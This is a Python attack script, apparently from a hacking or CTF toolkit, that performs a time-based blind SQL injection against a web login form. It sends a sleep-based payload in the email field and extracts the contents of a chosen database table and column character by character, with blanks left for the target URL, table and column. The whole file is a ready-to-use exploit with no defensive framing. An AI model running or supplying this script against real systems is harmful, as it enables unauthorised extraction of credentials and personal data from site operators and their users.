#!/usr/bin/python3

import sys
import signal
import requests
import time
from urllib3.exceptions import InsecureRequestWarning
from pwn import *

# Disable warnings because of an autosigned certificate
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# GLOBAL VARIABLES

url = '' # Change this for the url to the vulnerable login panel
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890,.-;:_{}[]!"#$%&/()=@'
result = ''
table = '' # Change this to the table to dump
column = '' # Change the column to dump

######### Note ##############     
   
# Change the data_post for the correct parameters of the login panel

#Ctrl+C

def def_handler(sig, frame):
    print("\n[-] Saliendo....")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def check(payload):
    data_post = {
        'email': '%s' % payload,
        'password': 'loquesea'
    }

    time_start = time.time()
    content = requests.post(url, data=data_post, verify=False)
    time_end = time.time()

    if time_end - time_start > 10:
        return 1


p1 = log.progress("Dumping %s" % column)
p2 = log.progress("Payload")

for j in range(0, 5):
    for i in range(1, 50):
        for c in s:
            payload = "' or if(substr((select %s from %s limit %d,1),%d,1)='%c',sleep(10),1)-- -" % (column, table, j, i, c)
        
            p2.status("%s" % payload)

            if check(payload):
                result += c
                p1.status("%s" % result)
                break

    log.info("%s: %s" % (column, result))


